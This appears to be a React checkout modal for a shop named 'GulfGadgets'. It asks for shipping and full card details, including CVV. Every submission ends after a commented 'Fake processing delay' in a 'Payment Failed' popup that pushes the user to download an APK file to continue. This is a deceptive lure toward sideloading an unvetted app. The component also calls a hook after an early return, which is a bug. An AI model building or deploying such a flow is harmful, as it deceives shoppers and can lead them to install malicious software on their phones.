import { useEffect, useState } from "react";
import { createPortal } from "react-dom";

export default function CheckoutModal({ open, onClose, total }) {
  if (!open) return null;

  // ==============================
  // 💥 FAILURE STATE
  // ==============================
  const [showFailure, setShowFailure] = useState(false);

  const handlePayment = (e) => {
    e.preventDefault();

    // Fake processing delay
    setTimeout(() => {
      setShowFailure(true);
    }, 700);
  };

  // ==============================
  // 💰 FORMAT
  // ==============================
  const format = (num) =>
    new Intl.NumberFormat("en-IN", {
      style: "currency",
      currency: "INR",
      maximumFractionDigits: 2,
    }).format(num);

  // ==============================
  // 🔒 LOCK SCROLL
  // ==============================
  useEffect(() => {
    document.body.style.overflow = "hidden";
    return () => (document.body.style.overflow = "auto");
  }, []);

  // ==============================
  // 🌍 COUNTRIES
  // ==============================
  const countries = [
    "Afghanistan","Albania","Algeria","Andorra","Angola","Argentina",
    "Australia","Austria","Bangladesh","Belgium","Brazil","Canada",
    "China","France","Germany","India","Indonesia","Italy","Japan",
    "Malaysia","Mexico","Nepal","Netherlands","New Zealand","Pakistan",
    "Philippines","Qatar","Russia","Saudi Arabia","Singapore",
    "South Africa","South Korea","Spain","Sri Lanka","Sweden",
    "Switzerland","Thailand","Turkey","UAE","UK","USA","Vietnam","Zimbabwe",
  ];

  // ==============================
  // 🧱 UI
  // ==============================
  return createPortal(
    <div className="fixed inset-0 z-[9999] bg-black/70 backdrop-blur-md flex items-center justify-center p-4">

      {/* Modal Card */}
      <div className="relative bg-[#16252d] border border-[#233c48] w-full max-w-[960px] rounded-xl shadow-2xl overflow-hidden flex flex-col md:flex-row max-h-[95vh]">

        {/* LEFT PANEL */}
        <div className="w-full md:w-1/3 bg-[#1c2e38] p-8 flex flex-col border-b md:border-b-0 md:border-r border-[#233c48]">

          <h2 className="text-xl font-bold text-white mb-6">
            GulfGadgets
          </h2>

          <div className="relative w-full aspect-[1.6/1] bg-gradient-to-br from-primary to-[#0c6ba0] rounded-xl p-6 shadow-lg mb-8">
            <div className="text-white tracking-widest">
              **** **** **** 4242
            </div>

            <div className="flex justify-between mt-6 text-white">
              <span>John Doe</span>
              <span>12 / 26</span>
            </div>
          </div>

          <div className="mt-auto border-t border-[#233c48] pt-6">
            <div className="flex justify-between text-white text-lg font-bold">
              <span>Total</span>
              <span className="text-primary">
                {format(total)}
              </span>
            </div>
          </div>
        </div>

        {/* RIGHT FORM */}
        <div className="w-full md:w-2/3 p-8 overflow-y-auto">

          <div className="flex justify-between mb-6">
            <h3 className="text-xl text-white font-bold">
              Secure Checkout
            </h3>

            <button
              onClick={onClose}
              className="text-gray-400 hover:text-white text-xl"
            >
              ✕
            </button>
          </div>

          {/* FORM */}
          <form onSubmit={handlePayment} className="space-y-6">

            <input
              placeholder="Cardholder Name"
              className="w-full bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
            />

            <input
              placeholder="Contact Number"
              className="w-full bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
            />

            <input
              placeholder="Street Address"
              className="w-full bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
            />

            <div className="grid grid-cols-2 gap-4">
              <input
                placeholder="City"
                className="bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
              />
              <input
                placeholder="State"
                className="bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <input
                placeholder="Zip Code"
                className="bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
              />

              <select className="bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4">
                <option value="">Select Country</option>
                {countries.map((country) => (
                  <option key={country} value={country}>
                    {country}
                  </option>
                ))}
              </select>
            </div>

            <input
              placeholder="Card Number"
              className="w-full bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
            />

            <div className="grid grid-cols-3 gap-4">
              <input
                placeholder="MM"
                className="bg-[#101c22] text-white border border-[#233c48] rounded-lg py-3 px-4"
              />
              <input
                placeholder="YYYY"
                className="bg-[#101c22] text-white border border-[#233c48] rounded-lg py-3 px-4"
              />
              <input
                placeholder="CVV"
                className="bg-[#101c22] text-white border border-[#233c48] rounded-lg py-3 px-4"
              />
            </div>

            <button
              type="submit"
              className="w-full text-white bg-primary py-4 rounded-lg font-bold"
            >
              Pay {format(total)}
            </button>
          </form>
        </div>

        {/* ===================================== */}
        {/* 💥 PAYMENT FAILURE POPUP */}
        {/* ===================================== */}
        {showFailure && (
          <div className="absolute inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 p-4">

            <div className="bg-[#16252d] border border-[#233c48] rounded-xl p-8 max-w-md w-full text-center shadow-2xl">

              <div className="text-red-500 text-6xl mb-4">
                ⚠️
              </div>

              <h2 className="text-2xl font-bold text-white mb-2">
                Payment Failed
              </h2>

              <p className="text-gray-400 mb-6 leading-relaxed">
                Your payment could not be processed.
                <br />
                Download our mobile app to continue checkout.
              </p>

              <a
                href="/app-download.apk"
                download
                className="block w-full bg-primary text-white py-3 rounded-lg font-bold hover:opacity-90 transition"
              >
                Download Our App
              </a>

              <button
                onClick={() => setShowFailure(false)}
                className="mt-4 text-sm text-gray-400 hover:text-white"
              >
                Continue on Website
              </button>
            </div>
          </div>
        )}
      </div>
    </div>,
    document.body
  );
}
